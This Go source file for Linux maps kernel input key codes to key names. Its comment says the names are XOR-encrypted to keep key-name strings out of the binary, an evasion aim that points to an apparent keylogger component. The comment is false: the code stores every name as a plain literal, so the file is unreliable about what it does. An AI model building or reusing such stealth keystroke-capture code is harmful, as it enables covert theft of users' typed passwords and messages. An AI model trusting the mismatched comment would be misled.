//go:build linux

package main


// keyMap is built at init() from XOR-encrypted constants so no key-name
// literal exists in the binary's .rodata. Codes are Linux KEY_* values
// from <linux/input-event-codes.h>.
var keyMap map[uint16]string

func init() {
	keyMap = map[uint16]string{
		1: "ESC", 2: "1", 3: "2",
		4: "3", 5: "4", 6: "5",
		7: "6", 8: "7", 9: "8",
		10: "9", 11: "0", 12: "-",
		13: "=", 14: "BACKSPACE", 15: "TAB",
		16: "q", 17: "w", 18: "e",
		19: "r", 20: "t", 21: "y",
		22: "u", 23: "i", 24: "o",
		25: "p", 26: "[", 27: "]",
		28: "ENTER", 29: "LCTRL", 30: "a",
		31: "s", 32: "d", 33: "f",
		34: "g", 35: "h", 36: "j",
		37: "k", 38: "l", 39: ";",
		40: "'", 41: "`", 42: "LSHIFT",
		43: `\`, 44: "z", 45: "x",
		46: "c", 47: "v", 48: "b",
		49: "n", 50: "m", 51: ",",
		52: ".", 53: "/", 54: "RSHIFT",
		55: "KP*", 56: "LALT", 57: "SPACE",
		58: "CAPSLOCK", 59: "F1", 60: "F2",
		61: "F3", 62: "F4", 63: "F5",
		64: "F6", 65: "F7", 66: "F8",
		67: "F9", 68: "F10", 69: "NUMLOCK",
		70: "SCROLLLOCK", 71: "KP7", 72: "KP8",
		73: "KP9", 74: "KP-", 75: "KP4",
		76: "KP5", 77: "KP6", 78: "KP+",
		79: "KP1", 80: "KP2", 81: "KP3",
		82: "KP0", 83: "KP.", 87: "F11",
		88: "F12", 96: "KPENTER", 97: "RCTRL",
		98: "KP/", 100: "RALT", 102: "HOME",
		103: "UP", 104: "PAGEUP", 105: "LEFT",
		106: "RIGHT", 107: "END", 108: "DOWN",
		109: "PAGEDOWN", 110: "INSERT", 111: "DELETE",
		119: "PAUSE", 125: "LWIN", 126: "RWIN",
		127: "COMPOSE",
	}
}
